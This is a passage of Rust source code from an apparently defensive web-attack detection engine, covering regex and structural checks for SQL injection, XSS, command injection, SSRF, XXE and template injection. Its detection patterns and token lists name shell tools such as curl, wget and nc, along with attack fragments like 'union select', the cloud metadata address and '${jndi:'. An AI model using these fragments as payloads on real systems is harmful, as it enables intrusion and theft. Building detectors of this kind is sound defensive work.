//! INVARIANT Engine — Core Detection Engine (v3, Multi-Level)
//!
//! Detection Flow:
//!   1. L1 runs regex fast-path on ALL classes (sub-millisecond)
//!   2. L2 runs structural evaluators (deeper, still fast)
//!   3. If L1+L2 both fire → convergent evidence → boost confidence
//!   4. If only L2 fires → novel variant that bypassed regex
//!   5. If only L1 fires → known pattern, attenuated confidence
//!
//! The key insight: regex catches known patterns fast.
//! Structural evaluators catch unknown patterns that preserve the PROPERTY.
//! Running both catches everything and rates confidence correctly.

use crate::classes::{ClassDefinition, all_classes};
use crate::entropy::{anomaly_confidence_multiplier, compute_anomaly_profile};
use crate::evaluators::{L2InputHints, L2Result, evaluate_l2_with_hints};
use crate::normalizer::{NormalizationOptions, canonicalize, detect_encoding_evasion};
use crate::proof::construct_proof;
use crate::types::*;
use regex::Regex;
use std::cmp::Ordering;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

const MAX_INPUT_BYTES: usize = 1024 * 1024;
const L1_TIMEOUT_HEURISTIC_UNITS: usize = 700_000;

static SAFE_UUID_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$")
        .unwrap()
});
static SAFE_ISO_DATE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^\d{4}-\d{2}-\d{2}(?:[Tt ]\d{2}:\d{2}:\d{2}(?:\.\d{1,6})?(?:Z|[+\-]\d{2}:\d{2})?)?$",
    )
    .unwrap()
});
static SAFE_EMAIL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,63}$").unwrap());

static SQL_HINT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:select|union|insert|update|delete|drop|alter|create|exec(?:ute)?|where|from|into|and|or|sleep|benchmark|waitfor|pg_sleep|chr|char)\b").unwrap()
});
static URL_HINT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:https?|ftp|file|gopher|ldap|dict|ws|wss)://|\b(?:localhost|127\.0\.0\.1|169\.254\.169\.254)\b").unwrap()
});
static XML_HINT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)<!DOCTYPE|<!ENTITY|<\?xml|</?[a-z][^>]*>").unwrap());
static GRAPHQL_HINT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:query|mutation|fragment|__schema|__type)\b|[{][^}]*[}]").unwrap()
});
static TEMPLATE_HINT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\{\{|\}\}|\$\{|#\{|<%|%>").unwrap());
static SHELL_HINT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:bash|sh|cmd|powershell|curl|wget|nc|ncat|python|perl|ruby|php|whoami|id|cat|ls)\b").unwrap()
});

#[derive(Debug, Clone, Copy)]
struct InputProfile {
    is_ascii_alnum_only: bool,
    has_angle_bracket: bool,
    has_semicolon: bool,
    has_quote: bool,
    has_percent: bool,
    has_path_separator: bool,
    has_newline: bool,
    has_colon: bool,
    has_equals: bool,
    has_dollar: bool,
    has_js_protocol: bool,
    has_sql_keyword: bool,
    has_url_hint: bool,
    has_xml_hint: bool,
    has_graphql_hint: bool,
    has_template_hint: bool,
    has_shell_hint: bool,
}

impl InputProfile {
    fn from_input(input: &str) -> Self {
        Self {
            is_ascii_alnum_only: !input.is_empty()
                && input.bytes().all(|b| b.is_ascii_alphanumeric()),
            has_angle_bracket: input.contains('<') || input.contains('>'),
            has_semicolon: input.contains(';'),
            has_quote: input.contains('\'') || input.contains('"') || input.contains('`'),
            has_percent: input.contains('%'),
            has_path_separator: input.contains('/') || input.contains('\\') || input.contains('.'),
            has_newline: input.contains('\n') || input.contains('\r'),
            has_colon: input.contains(':'),
            has_equals: input.contains('='),
            has_dollar: input.contains('$'),
            has_js_protocol: input
                .trim_start()
                .to_ascii_lowercase()
                .starts_with("javascript:"),
            has_sql_keyword: SQL_HINT_RE.is_match(input),
            has_url_hint: URL_HINT_RE.is_match(input),
            has_xml_hint: XML_HINT_RE.is_match(input),
            has_graphql_hint: GRAPHQL_HINT_RE.is_match(input),
            has_template_hint: TEMPLATE_HINT_RE.is_match(input),
            has_shell_hint: SHELL_HINT_RE.is_match(input),
        }
    }

    fn l2_hints(self) -> L2InputHints {
        L2InputHints {
            sql_like: self.has_sql_keyword || self.has_quote || self.has_semicolon,
            html_like: self.has_angle_bracket || self.has_quote || self.has_js_protocol,
            shell_like: self.has_semicolon || self.has_dollar || self.has_shell_hint,
            path_like: self.has_path_separator || self.has_percent,
            url_like: self.has_url_hint
                || (self.has_colon && (self.has_path_separator || self.has_percent)),
            xml_like: self.has_xml_hint || self.has_angle_bracket,
            template_like: self.has_template_hint || self.has_dollar,
            header_like: self.has_newline || (self.has_colon && self.has_equals),
            graphql_like: self.has_graphql_hint,
            websocket_like: self.has_url_hint || self.has_newline,
        }
    }
}

#[inline]
fn is_known_safe_pattern(input: &str) -> bool {
    SAFE_UUID_RE.is_match(input)
        || SAFE_ISO_DATE_RE.is_match(input)
        || SAFE_EMAIL_RE.is_match(input)
}

#[cfg(test)]
static DETECTION_PASS_COUNT: std::sync::atomic::AtomicUsize =
    std::sync::atomic::AtomicUsize::new(0);

#[cfg(test)]
fn reset_detection_pass_count() {
    DETECTION_PASS_COUNT.store(0, std::sync::atomic::Ordering::Relaxed);
}

#[cfg(test)]
fn read_detection_pass_count() -> usize {
    DETECTION_PASS_COUNT.load(std::sync::atomic::Ordering::Relaxed)
}

fn is_input_too_large(input: &str) -> bool {
    input.len() > MAX_INPUT_BYTES
}

fn validate_input_size(input: &str) -> InvariantResult<()> {
    if is_input_too_large(input) {
        return Err(InvariantError::invalid_input(format!(
            "input exceeds maximum allowed size ({} bytes)",
            MAX_INPUT_BYTES
        )));
    }
    Ok(())
}

fn should_skip_l1_scan(input: &str, class_count: usize) -> bool {
    input.len().saturating_mul(class_count) > L1_TIMEOUT_HEURISTIC_UNITS
}

fn normalized_scan_key(input: &str) -> String {
    // Key by exact candidate bytes so raw and canonicalized passes do not alias.
    // This preserves second-pass recall for encoded payloads while still
    // deduplicating identical pass inputs.
    input.to_owned()
}

fn annotate_decisive_level(description: &str, level: &str) -> String {
    format!("{description} [decisive_level={level}]")
}

fn decisive_level_for_match(m: &InvariantMatch) -> &'static str {
    if m.detection_levels.l2 {
        "L2"
    } else if m.detection_levels.l1 {
        "L1"
    } else {
        "L3"
    }
}

fn sort_matches_by_priority(matches: &mut Vec<InvariantMatch>) {
    matches.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| {
                b.confidence
                    .partial_cmp(&a.confidence)
                    .unwrap_or(Ordering::Equal)
            })
            .then_with(|| format!("{:?}", a.class).cmp(&format!("{:?}", b.class)))
    });
}

fn filter_pass_signals(
    source: &HashMap<InvariantClass, PassSignals>,
    focus_classes: Option<&HashSet<InvariantClass>>,
) -> HashMap<InvariantClass, PassSignals> {
    match focus_classes {
        None => source.clone(),
        Some(filter) => source
            .iter()
            .filter_map(|(class, signals)| {
                if filter.contains(class) {
                    Some((*class, signals.clone()))
                } else {
                    None
                }
            })
            .collect(),
    }
}

fn detect_deep_decisive_level_reason(m: &InvariantMatch) -> String {
    format!(
        "decisive_level:{}",
        decisive_level_for_match(m).to_lowercase()
    )
}

fn l2_to_detection_result(l2: &L2Result) -> DetectionResult {
    DetectionResult {
        detected: true,
        confidence: l2.confidence,
        explanation: l2.detail.clone(),
        evidence: None,
        structured_evidence: l2
            .evidence
            .iter()
            .map(|e| StructuredEvidence {
                operation: match e.operation {
                    crate::evaluators::EvidenceOperation::ContextEscape => {
                        ProofOperation::ContextEscape
                    }
                    crate::evaluators::EvidenceOperation::PayloadInject => {
                        ProofOperation::PayloadInject
                    }
                    crate::evaluators::EvidenceOperation::SyntaxRepair => {
                        ProofOperation::SyntaxRepair
                    }
                    crate::evaluators::EvidenceOperation::EncodingDecode => {
                        ProofOperation::EncodingDecode
                    }
                    crate::evaluators::EvidenceOperation::TypeCoerce => ProofOperation::TypeCoerce,
                    crate::evaluators::EvidenceOperation::SemanticEval => {
                        ProofOperation::SemanticEval
                    }
                },
                matched_input: e.matched_input.clone(),
                interpretation: e.interpretation.clone(),
                offset: e.offset,
                property: e.property.clone(),
            })
            .collect(),
    }
}

// ── Composition Rules ────────────────────────────────────────────

struct CompositionRule {
    a: InvariantClass,
    b: InvariantClass,
    completer: Option<InvariantClass>,
    escape: Option<EscapeOperation>,
    payload: PayloadOperation,
    repair: RepairOperation,
    repair_complete: Option<RepairOperation>,
    context: InputContext,
    confidence: f64,
    confidence_complete: Option<f64>,
    derived_class: InvariantClass,
    always_complete: bool,
}

#[derive(Default, Clone)]
struct PassSignals {
    l1: bool,
    l2: Option<L2Result>,
}

static COMPOSITION_RULES: std::sync::LazyLock<Vec<CompositionRule>> =
    std::sync::LazyLock::new(|| {
        vec![
            // SQL: string termination + union extraction
            CompositionRule {
                a: InvariantClass::SqlStringTermination,
                b: InvariantClass::SqlUnionExtraction,
                completer: Some(InvariantClass::SqlCommentTruncation),
                escape: Some(EscapeOperation::StringTerminate),
                payload: PayloadOperation::UnionExtract,
                repair: RepairOperation::None,
                repair_complete: Some(RepairOperation::CommentClose),
                context: InputContext::Sql,
                confidence: 0.93,
                confidence_complete: Some(0.99),
                derived_class: InvariantClass::SqlUnionExtraction,
                always_complete: false,
            },
            // SQL: string termination + tautology
            CompositionRule {
                a: InvariantClass::SqlStringTermination,
                b: InvariantClass::SqlTautology,
                completer: Some(InvariantClass::SqlCommentTruncation),
                escape: Some(EscapeOperation::StringTerminate),
                payload: PayloadOperation::Tautology,
                repair: RepairOperation::None,
                repair_complete: Some(RepairOperation::CommentClose),
                context: InputContext::Sql,
                confidence: 0.92,
                confidence_complete: Some(0.99),
                derived_class: InvariantClass::SqlTautology,
                always_complete: false,
            },
            // SQL: string termination + time oracle
            CompositionRule {
                a: InvariantClass::SqlStringTermination,
                b: InvariantClass::SqlTimeOracle,
                completer: Some(InvariantClass::SqlCommentTruncation),
                escape: Some(EscapeOperation::StringTerminate),
                payload: PayloadOperation::TimeOracle,
                repair: RepairOperation::None,
                repair_complete: None,
                context: InputContext::Sql,
                confidence: 0.91,
                confidence_complete: None,
                derived_class: InvariantClass::SqlTimeOracle,
                always_complete: false,
            },
            // SQL: string termination + stacked execution (always complete)
            CompositionRule {
                a: InvariantClass::SqlStringTermination,
                b: InvariantClass::SqlStackedExecution,
                completer: None,
                escape: Some(EscapeOperation::StringTerminate),
                payload: PayloadOperation::StackedExec,
                repair: RepairOperation::NaturalEnd,
                repair_complete: None,
                context: InputContext::Sql,
                confidence: 0.95,
                confidence_complete: None,
                derived_class: InvariantClass::SqlStackedExecution,
                always_complete: true,
            },
            // XSS: attribute escape + event handler
            CompositionRule {
                a: InvariantClass::XssAttributeEscape,
                b: InvariantClass::XssEventHandler,
                completer: None,
                escape: Some(EscapeOperation::ContextBreak),
                payload: PayloadOperation::EventHandler,
                repair: RepairOperation::TagClose,
                repair_complete: None,
                context: InputContext::Html,
                confidence: 0.96,
                confidence_complete: None,
                derived_class: InvariantClass::XssEventHandler,
                always_complete: true,
            },
            // XSS: tag injection + protocol handler
            CompositionRule {
                a: InvariantClass::XssTagInjection,
                b: InvariantClass::XssProtocolHandler,
                completer: None,
                escape: Some(EscapeOperation::ContextBreak),
                payload: PayloadOperation::TagInject,
                repair: RepairOperation::TagClose,
                repair_complete: None,
                context: InputContext::Html,
                confidence: 0.94,
                confidence_complete: None,
                derived_class: InvariantClass::XssProtocolHandler,
                always_complete: true,
            },
            // Path: dotdot + encoding bypass
            CompositionRule {
                a: InvariantClass::PathDotdotEscape,
                b: InvariantClass::PathEncodingBypass,
                completer: None,
                escape: Some(EscapeOperation::EncodingBypass),
                payload: PayloadOperation::PathEscape,
                repair: RepairOperation::None,
                repair_complete: None,
                context: InputContext::Url,
                confidence: 0.93,
                confidence_complete: None,
                derived_class: InvariantClass::PathDotdotEscape,
                always_complete: false,
            },
            // Path: dotdot + null terminate (complete)
            CompositionRule {
                a: InvariantClass::PathDotdotEscape,
                b: InvariantClass::PathNullTerminate,
                completer: None,
                escape: Some(EscapeOperation::NullTerminate),
                payload: PayloadOperation::PathEscape,
                repair: RepairOperation::NaturalEnd,
                repair_complete: None,
                context: InputContext::Url,
                confidence: 0.95,
                confidence_complete: None,
                derived_class: InvariantClass::PathNullTerminate,
                always_complete: true,
            },
            // SSRF: internal reach + protocol smuggle
            CompositionRule {
                a: InvariantClass::SsrfInternalReach,
                b: InvariantClass::SsrfProtocolSmuggle,
                completer: None,
                escape: Some(EscapeOperation::EncodingBypass),
                payload: PayloadOperation::ProtoPollute,
                repair: RepairOperation::None,
                repair_complete: None,
                context: InputContext::Url,
                confidence: 0.94,
                confidence_complete: None,
                derived_class: InvariantClass::SsrfProtocolSmuggle,
                always_complete: true,
            },
            // CMDi: separator + substitution
            CompositionRule {
                a: InvariantClass::CmdSeparator,
                b: InvariantClass::CmdSubstitution,
                completer: None,
                escape: Some(EscapeOperation::ContextBreak),
                payload: PayloadOperation::CmdSubstitute,
                repair: RepairOperation::NaturalEnd,
                repair_complete: None,
                context: InputContext::Shell,
                confidence: 0.96,
                confidence_complete: None,
                derived_class: InvariantClass::CmdSubstitution,
                always_complete: true,
            },
            // SSTI + cmd separator → server RCE
            CompositionRule {
                a: InvariantClass::SstiJinjaTwig,
                b: InvariantClass::CmdSeparator,
                completer: None,
                escape: Some(EscapeOperation::ContextBreak),
                payload: PayloadOperation::CmdSubstitute,
                repair: RepairOperation::NaturalEnd,
                repair_complete: None,
                context: InputContext::Template,
                confidence: 0.97,
                confidence_complete: None,
                derived_class: InvariantClass::SstiJinjaTwig,
                always_complete: true,
            },
            // XXE + SSRF internal reach
            CompositionRule {
                a: InvariantClass::XxeEntityExpansion,
                b: InvariantClass::SsrfInternalReach,
                completer: None,
                escape: Some(EscapeOperation::ContextBreak),
                payload: PayloadOperation::EntityExpand,
                repair: RepairOperation::None,
                repair_complete: None,
                context: InputContext::Xml,
                confidence: 0.95,
                confidence_complete: None,
                derived_class: InvariantClass::XxeEntityExpansion,
                always_complete: true,
            },
            // XSS + CORS origin abuse → stored CORS-poisoned XSS
            CompositionRule {
                a: InvariantClass::XssTagInjection,
                b: InvariantClass::CorsOriginAbuse,
                completer: None,
                escape: Some(EscapeOperation::ContextBreak),
                payload: PayloadOperation::TagInject,
                repair: RepairOperation::TagClose,
                repair_complete: None,
                context: InputContext::Html,
                confidence: 0.88,
                confidence_complete: None,
                derived_class: InvariantClass::XssTagInjection,
                always_complete: true,
            },
            // Prototype pollution + command separator → prototype pollution gadget chain
            CompositionRule {
                a: InvariantClass::ProtoPollution,
                b: InvariantClass::CmdSeparator,
                completer: None,
                escape: None,
                payload: PayloadOperation::ProtoPollute,
                repair: RepairOperation::None,
                repair_complete: None,
                context: InputContext::Json,
                confidence: 0.91,
                confidence_complete: None,
                derived_class: InvariantClass::ProtoPollutionGadget,
                always_complete: true,
            },
            // SSRF internal reach + cloud metadata → full cloud credential exfil
            CompositionRule {
                a: InvariantClass::SsrfInternalReach,
                b: InvariantClass::SsrfCloudMetadata,
                completer: None,
                escape: Some(EscapeOperation::EncodingBypass),
                payload: PayloadOperation::PathEscape,
                repair: RepairOperation::None,
                repair_complete: None,
                context: InputContext::Url,
                confidence: 0.94,
                confidence_complete: None,
                derived_class: InvariantClass::SsrfCloudMetadata,
                always_complete: true,
            },
            // SQLi + path traversal → database file read via infile/outfile
            CompositionRule {
                a: InvariantClass::SqlStringTermination,
                b: InvariantClass::PathDotdotEscape,
                completer: None,
                escape: Some(EscapeOperation::StringTerminate),
                payload: PayloadOperation::PathEscape,
                repair: RepairOperation::NaturalEnd,
                repair_complete: None,
                context: InputContext::Sql,
                confidence: 0.90,
                confidence_complete: None,
                derived_class: InvariantClass::SqlStackedExecution,
                always_complete: false,
            },
        ]
    });

// ── Severity Thresholds ──────────────────────────────────────────

fn severity_threshold(severity: Severity) -> f64 {
    severity.block_threshold()
}

// ── Context Relevance Maps ───────────────────────────────────────

fn class_domain(class: InvariantClass) -> Option<&'static str> {
    let prefix = class.proof_domain();
    match prefix {
        "sqli" => Some("sql"),
        "xss" => Some("html"),
        "cmdi" => Some("shell"),
        "path_traversal" => Some("path"),
        "ssrf" => Some("url"),
        "xxe" => Some("xml"),
        "ssti" => Some("template"),
        "generic" => None,
        _ => None,
    }
}

fn escalate_severity(severity: Severity) -> Severity {
    match severity {
        Severity::Low => Severity::Medium,
        Severity::Medium => Severity::High,
        Severity::High => Severity::Critical,
        Severity::Critical => Severity::Critical,
    }
}

fn merge_l1_l2(signals: &PassSignals, base: &mut PassSignals) {
    if signals.l1 {
        base.l1 = true;
    }
    if let Some(l2) = &signals.l2 {
        if base.l2.as_ref().is_none()
            || l2.confidence > base.l2.as_ref().map(|x| x.confidence).unwrap_or(0.0)
        {
            base.l2 = Some(l2.clone());
        }
    }
}

fn detection_pass(
    classes: &'static [ClassDefinition],
    input: &str,
    focus_classes: Option<&HashSet<InvariantClass>>,
) -> HashMap<InvariantClass, PassSignals> {
    #[cfg(test)]
    DETECTION_PASS_COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);

    let profile = InputProfile::from_input(input);
    let l2_hints = profile.l2_hints();
    let mut l1_hits: HashMap<InvariantClass, PassSignals> = HashMap::new();
    let skip_l1 = should_skip_l1_scan(input, classes.len());

    // L1: regex fast-path
    if !skip_l1 {
        for class in classes {
            if let Some(filter) = focus_classes {
                if !filter.contains(&class.id) {
                    continue;
                }
            }
            if should_skip_l1_class(class.id, &profile) {
                continue;
            }
            if (class.detect)(input) {
                l1_hits
                    .entry(class.id)
                    .or_insert_with(PassSignals::default)
                    .l1 = true;
            }
        }
    }

    // L2: structural evaluators
    for result in evaluate_l2_with_hints(input, &l2_hints) {
        if let Some(filter) = focus_classes {
            if !filter.contains(&result.class) {
                continue;
            }
        }
        let entry = l1_hits
            .entry(result.class)
            .or_insert_with(PassSignals::default);
        if entry.l2.as_ref().is_none()
            || result.confidence > entry.l2.as_ref().map(|r| r.confidence).unwrap_or(0.0)
        {
            entry.l2 = Some(result);
        }
    }

    l1_hits
}

#[inline]
fn should_skip_l1_class(class_id: InvariantClass, profile: &InputProfile) -> bool {
    if profile.is_ascii_alnum_only {
        return true;
    }

    match class_id.category() {
        AttackCategory::Sqli => {
            !(profile.has_sql_keyword
                || profile.has_quote
                || profile.has_semicolon
                || profile.has_percent)
        }
        AttackCategory::Xss => {
            !(profile.has_angle_bracket
                || profile.has_quote
                || profile.has_percent
                || profile.has_js_protocol)
        }
        AttackCategory::Cmdi => {
            !(profile.has_semicolon || profile.has_dollar || profile.has_shell_hint)
        }
        AttackCategory::PathTraversal => !(profile.has_path_separator || profile.has_percent),
        AttackCategory::Ssrf => {
            !(profile.has_url_hint || profile.has_colon || profile.has_path_separator)
        }
        AttackCategory::Smuggling => !(profile.has_newline || profile.has_colon),
        _ => false,
    }
}

fn apply_weak_signal_convergence_boost(matches: &mut HashMap<InvariantClass, InvariantMatch>) {
    let mut by_domain: HashMap<&'static str, Vec<InvariantClass>> = HashMap::new();
    for class in matches.keys() {
        if let Some(domain) = class_domain(*class) {
            by_domain.entry(domain).or_default().push(*class);
        }
    }

    for classes in by_domain.into_values() {
        if classes.len() < 2 {
            continue;
        }

        let weak: Vec<_> = classes
            .into_iter()
            .filter_map(|class_id| {
                let item = matches.get(&class_id)?;
                if item.confidence < 0.82 {
                    Some(class_id)
                } else {
                    None
                }
            })
            .collect();

        if weak.len() >= 2 {
            let boost = 0.04 + ((weak.len() as f64 - 2.0) * 0.01).min(0.08);
            for class_id in weak {
                if let Some(item) = matches.get_mut(&class_id) {
                    item.confidence = (item.confidence + boost).min(0.99);
                    item.severity = escalate_severity(item.severity);
                }
            }
        }
    }
}

fn derive_orchestration_focus(
    first_pass: &HashMap<InvariantClass, PassSignals>,
    environment: Option<&str>,
) -> HashSet<InvariantClass> {
    let mut classes = HashSet::new();
    for class in first_pass.keys() {
        if class_domain(*class).is_some() {
            classes.insert(*class);
        }
    }

    if let Some(env) = environment {
        if let Some(ctx) = context_relevance(env) {
            for class in first_pass.keys() {
                if let Some(domain) = class_domain(*class) {
                    if ctx.primary.contains(domain) {
                        classes.insert(*class);
                    }
                }
            }
        }
    }

    classes
}

fn encoding_depth_multiplier(depth: usize) -> f64 {
    match depth {
        0 => 1.0,
        1 => 1.02,
        2 => 1.05,
        3 => 1.07,
        _ => 1.09,
    }
}

struct ContextRelevance {
    primary: HashSet<&'static str>,
    secondary: HashSet<&'static str>,
}

fn context_relevance(context: &str) -> Option<ContextRelevance> {
    let (primary, secondary) = match context {
        "sql" => (vec!["sql"], vec!["shell", "nosql"]),
        "html" => (vec!["html"], vec!["template", "url"]),
        "shell" => (vec!["shell"], vec!["path", "url"]),
        "xml" => (vec!["xml"], vec!["html"]),
        "json" => (vec!["sql", "nosql", "proto"], vec!["api"]),
        "ldap" => (vec!["ldap"], vec!["auth"]),
        "template" => (vec!["template"], vec!["html", "shell"]),
        "graphql" => (vec!["graphql"], vec!["sql", "nosql"]),
        "url" => (vec!["url"], vec!["path", "http"]),
        _ => return None,
    };
    Some(ContextRelevance {
        primary: primary.into_iter().collect(),
        secondary: secondary.into_iter().collect(),
    })
}

fn contains_word(haystack: &str, needle: &str) -> bool {
    haystack
        .split(|c: char| !c.is_ascii_alphanumeric() && c != '_')
        .any(|part| part.eq_ignore_ascii_case(needle))
}

fn natural_word_count(input: &str) -> usize {
    input
        .split_whitespace()
        .filter(|w| {
            let alpha = w.chars().filter(|c| c.is_ascii_alphabetic()).count();
            alpha >= 2
        })
        .count()
}

fn attack_token_count(input: &str) -> usize {
    let lower = input.to_ascii_lowercase();
    let tokens = [
        "' or ",
        "\" or ",
        " or 1=1",
        "union select",
        "sleep(",
        "benchmark(",
        "--",
        "/*",
        "*/",
        "<script",
        "javascript:",
        "onerror=",
        "onload=",
        "../",
        "%2e%2e",
        "$(",
        "`",
        ";",
        "&&",
        "||",
        "127.0.0.1",
        "169.254.169.254",
        "file://",
        "$where",
        "__proto__",
        "${jndi:",
    ];
    tokens.iter().filter(|t| lower.contains(**t)).count()
}

fn looks_like_documentation(input: &str) -> bool {
    let lower = input.to_ascii_lowercase();
    [
        "example",
        "tutorial",
        "how to",
        "walkthrough",
        "documentation",
        "docs",
        "for educational",
        "sample payload",
    ]
    .iter()
    .any(|kw| lower.contains(kw))
}

fn looks_like_search_query(input: &str) -> bool {
    let lower = input.to_ascii_lowercase();
    if lower.len() > 120 {
        return false;
    }
    let has_boolean = lower.contains(" or ") || lower.contains(" and ");
    let has_danger = ["=", ";", "<", ">", "--", "/*", "*/", "'"]
        .iter()
        .any(|x| lower.contains(x));
    has_boolean && !has_danger && natural_word_count(input) >= 2
}

fn looks_like_error_echo(input: &str) -> bool {
    let lower = input.to_ascii_lowercase();
    static ERR_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
        regex::Regex::new(r"^(?:error)|invalid syntax|syntax error|near ").unwrap()
    });
    let err = ERR_RE.is_match(&lower);
    err && ["select", "union", "where", "from"]
        .iter()
        .any(|kw| contains_word(&lower, kw))
}

fn looks_like_natural_language_sql_usage(input: &str) -> bool {
    let lower = input.to_ascii_lowercase();
    let has_sql_word = ["select", "from", "where", "or", "and"]
        .iter()
        .any(|kw| contains_word(&lower, kw));
    if !has_sql_word {
        return false;
    }

    let sentence_like = natural_word_count(input) >= 5
        && (lower.contains(" your ")
            || lower.contains(" the ")
            || lower.contains(" user ")
            || lower.contains(" admin ")
            || lower.contains(" near "));
    let dangerous_shape = [
        "union select",
        " or 1=1",
        "drop table",
        "insert into",
        "select * from",
        "--",
        ";",
        "/*",
        "*/",
    ]
    .iter()
    .any(|x| lower.contains(x));
    sentence_like && !dangerous_shape
}

fn looks_like_safe_rich_text_html(input: &str) -> bool {
    let lower = input.to_ascii_lowercase();
    if !lower.contains('<') || !lower.contains('>') {
        return false;
    }
    if [
        "<script",
        "<img",
        "<svg",
        "<iframe",
        "<style",
        "onerror=",
        "onload=",
        "onclick=",
        "javascript:",
    ]
    .iter()
    .any(|x| lower.contains(x))
    {
        return false;
    }

    let allowed = [
        "b", "i", "p", "br", "h1", "h2", "h3", "h4", "h5", "h6", "ul", "li", "a",
    ];
    let mut saw_tag = false;
    for segment in input.split('<').skip(1) {
        let Some(close_idx) = segment.find('>') else {
            continue;
        };
        let raw = segment[..close_idx].trim();
        if raw.is_empty() || raw.starts_with('!') || raw.starts_with('?') {
            continue;
        }
        let name_part = raw
            .trim_start_matches('/')
            .split_whitespace()
            .next()
            .unwrap_or("");
        let tag = name_part.trim_end_matches('/').to_ascii_lowercase();
        if tag.is_empty() {
            continue;
        }
        saw_tag = true;
        if !allowed.contains(&tag.as_str()) {
            return false;
        }
    }
    saw_tag
}

fn json_depth(value: &serde_json::Value) -> usize {
    match value {
        serde_json::Value::Array(items) => 1 + items.iter().map(json_depth).max().unwrap_or(0),
        serde_json::Value::Object(map) => 1 + map.values().map(json_depth).max().unwrap_or(0),
        _ => 1,
    }
}

fn looks_like_legitimate_nested_json(input: &str) -> bool {
    let trimmed = input.trim();
    if !(trimmed.starts_with('{') || trimmed.starts_with('[')) {
        return false;
    }
    let Ok(value) = serde_json::from_str::<serde_json::Value>(trimmed) else {
        return false;
    };
    let lower = trimmed.to_ascii_lowercase();
    let has_danger = [
        "$where",
        "function(",
        "__proto__",
        "constructor",
        "$ne",
        "$gt",
        "$regex",
        "<script",
        "javascript:",
    ]
    .iter()
    .any(|x| lower.contains(x));
    json_depth(&value) >= 3 && !has_danger
}

fn looks_like_base64_file_or_image(input: &str) -> bool {
    let trimmed = input.trim();
    let lower = trimmed.to_ascii_lowercase();
    if lower.starts_with("data:image/") && lower.contains(";base64,") {
        return true;
    }
    let prefixes = [
        "ivborw0kggo", // png
        "/9j/",        // jpeg
        "r0lgod",      // gif
        "jvberi0",     // pdf
        "uesdb",       // zip
        "uklgri",      // webp (RIFF in base64 prefix)
    ];
    if prefixes.iter().any(|p| lower.starts_with(p)) {
        return true;
    }
    if trimmed.len() < 64 || trimmed.len() % 4 != 0 {
        return false;
    }
    let base64_chars = trimmed
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(*c, '+' | '/' | '=' | '\n' | '\r'))
        .count();
    (base64_chars as f64 / trimmed.len() as f64) >= 0.98
}

fn benign_context_score(input: &str) -> f64 {
    let words = natural_word_count(input) as f64;
    let attack = attack_token_count(input) as f64;
    let mut score = if words <= 0.0 {
        0.0
    } else if attack <= 0.0 {
        (words / (words + 1.0)).min(0.75)
    } else {
        ((words / (words + attack * 6.0)) * 0.30).clamp(0.0, 0.30)
    };

    if looks_like_natural_language_sql_usage(input) {
        score += 0.35;
    }
    if looks_like_documentation(input) {
        score += 0.45;
    }
    if looks_like_safe_rich_text_html(input) {
        score += 0.45;
    }
    if looks_like_search_query(input) {
        score += 0.30;
    }
    if looks_like_error_echo(input) {
        score += 0.35;
    }
    if looks_like_legitimate_nested_json(input) {
        score += 0.35;
    }
    if looks_like_base64_file_or_image(input) {
        score += 0.50;
    }

    score.clamp(0.0, 1.0)
}

// ── Engine ───────────────────────────────────────────────────────

/// Contract for swappable engine implementations.
pub trait EngineSubsystem: Send + Sync {
    /// L1-only detection path.
    fn detect(&self, input: &str) -> Vec<InvariantMatch>;
    /// Multi-level (L1+L2) detection path.
    fn detect_deep(&self, input: &str, environment: Option<&str>) -> DeepDetectionResult;
    /// Full analysis with compositions and recommendation.
    fn analyze(&self, request: &AnalysisRequest) -> AnalysisResult;
    /// Highest severity among provided matches.
    fn highest_severity(&self, matches: &[InvariantMatch]) -> Severity;
    /// Whether current matches imply block recommendation.
    fn should_block(&self, matches: &[InvariantMatch]) -> bool;
    /// Count of registered classes.
    fn class_count(&self) -> usize;
}

/// Production detection engine implementation.

// Threshold constants
const CONFIDENCE_L2_CONVERGENT_FLOOR: f64 = 0.85;
const BOOST_CONVERGENT: f64 = 0.05;
const BOOST_L2_ONLY_PASS2: f64 = 0.02;
const BOOST_L2_CONTEXT: f64 = 0.01;
const BOOST_L2_NOVEL_CONTEXT: f64 = 0.03;
const ATTENUATE_L1_BASE: f64 = 0.85;
const BOOST_L1_CONTEXT: f64 = 0.02;
const BOOST_PRIMARY_CONTEXT: f64 = 0.10;
const BOOST_SECONDARY_CONTEXT: f64 = 0.04;
const PENALTY_OUT_OF_CONTEXT: f64 = 0.85;

pub struct InvariantEngine {
    classes: &'static [ClassDefinition],
    exceptions: Option<ExceptionConfig>,
}

impl InvariantEngine {
    /// Create an engine with all built-in class definitions.
    #[inline]
    pub fn new() -> Self {
        Self {
            classes: all_classes(),
            exceptions: None,
        }
    }

    /// Create an engine with exception post-filtering enabled.
    #[inline]
    pub fn with_exceptions(exceptions: ExceptionConfig) -> Self {
        Self {
            classes: all_classes(),
            exceptions: Some(exceptions),
        }
    }

    /// Create an engine with optional exception configuration.
    #[inline]
    pub fn with_optional_exceptions(exceptions: Option<ExceptionConfig>) -> Self {
        Self {
            classes: all_classes(),
            exceptions,
        }
    }

    /// Access immutable class definitions currently loaded by the engine.
    #[inline]
    pub fn classes(&self) -> &'static [ClassDefinition] {
        self.classes
    }

    /// Access the active exception configuration, when present.
    #[inline]
    pub fn exceptions(&self) -> Option<&ExceptionConfig> {
        self.exceptions.as_ref()
    }

    /// v2-compatible L1-only detection.
    #[inline]
